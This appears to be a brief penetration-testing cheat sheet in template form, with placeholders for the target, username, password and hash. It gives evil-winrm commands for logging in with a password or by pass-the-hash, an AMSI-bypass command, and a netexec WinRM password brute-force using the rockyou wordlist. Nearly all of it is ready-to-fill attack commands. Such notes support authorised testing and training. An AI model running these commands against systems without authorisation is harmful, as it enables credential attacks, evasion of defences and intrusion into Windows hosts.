Conn via WinRM (authenticated)
```powershell
evil-winrm -i <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -p <% tp.frontmatter["domain-password"] %>  
evil-winrm -i <% tp.frontmatter["RHOSTS"] %> -u <% tp.frontmatter["domain-username"] %> -H <% tp.frontmatter["domain-password-hash"] %> 
```

MSI bypass 
```powershell
Bypass-4MSI
```

WinRM password ==brute-force==
```powershell
netexec winrm <% tp.frontmatter["RHOSTS"] %> -d <% tp.frontmatter["VHOST"] %> -u <% tp.frontmatter["domain-username"] %> -p /usr/share/wordlists/rockyou.txt
```
